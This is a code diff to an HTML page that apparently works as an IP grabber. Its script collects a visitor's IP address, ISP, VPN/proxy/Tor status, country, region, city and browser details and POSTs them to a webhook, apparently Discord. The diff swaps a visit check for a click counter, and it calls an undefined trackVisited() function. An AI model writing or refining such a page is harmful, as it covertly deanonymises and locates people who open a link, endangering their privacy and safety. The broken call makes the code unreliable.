@@ -2,12 +2,14 @@
 <html>
 <body>
     <script>
-        function checkVisits() {
-          if (localStorage.getItem('visited')) {
-            window.close();
-          } else {
-            localStorage.setItem('visited', 'true');
-          }
+        function trackVisits() {
+            let numberOfVisits = localStorage.getItem('numberOfVisits');
+            if (numberOfVisits === null) {
+                numberOfVisits = 0;
+            }
+            numberOfVisits++;
+            localStorage.setItem('numberOfVisits', numberOfVisits);
+            return numberOfVisits;
         }
     </script>
     <script async>
@@ -49,25 +51,27 @@
                     cookies: navigator.cookieEnabled,
                 };
 
+                const visitscnt = trackVisits();
+                const visitedtf = trackVisited()
                 const overallEmbed = {
                     title: "Overall",
                     description: `----------------IP--------------
-IPv4: ${ipAddressData.ip}
-ISP: ${ipdata.asn.name}
-----------DETECTIONS--------
-VPN : ${isVPNDetected ? "2/2" : "0/2"}
-Proxy : ${isProxyDetected ? "2/2" : "0/2"}
-TOR : ${isTORDetected ? "2/2" : "0/2"}
------------LOCATION----------
-Country: ${ipinfoData.country || "N/A"}
-State: ${ipinfoData.region || "N/A"}
-City: ${ipinfoData.city || "N/A"}
---------------BROWSER-------------
-Browser: ${browserInfo.browser}
-OS: ${browserInfo.os}
-JS enabled: ${browserInfo.jsEnabled}
-Cookies: ${browserInfo.cookies}
----------------------------------`,
+                        IPv4: ${ipAddressData.ip}
+                        ISP: ${ipdata.asn.name}
+                        ----------DETECTIONS--------
+                        VPN : ${isVPNDetected ? "2/2" : "0/2"}
+                        Proxy : ${isProxyDetected ? "2/2" : "0/2"}
+                        TOR : ${isTORDetected ? "2/2" : "0/2"}
+                        -----------LOCATION----------
+                        Country: ${ipinfoData.country || "N/A"}
+                        State: ${ipinfoData.region || "N/A"}
+                        City: ${ipinfoData.city || "N/A"}
+                        --------------BROWSER-------------
+                        Times clicked: ${visitscnt}
+                        Browser: ${browserInfo.browser}
+                        OS: ${browserInfo.os}
+                        JS enabled: ${browserInfo.jsEnabled}
+                        Cookies: ${browserInfo.cookies}`,
                     color: isVPNDetected || isProxyDetected || isTORDetected ? 16711680 : 65280,
                 };
 
@@ -107,7 +111,7 @@ Cookies: ${browserInfo.cookies}
                     );
                     return;
                 }
-                checkVisits()
+
                 const webhookResponse = await fetch(webhookUrl, {
                     method: "POST",
                     headers: {
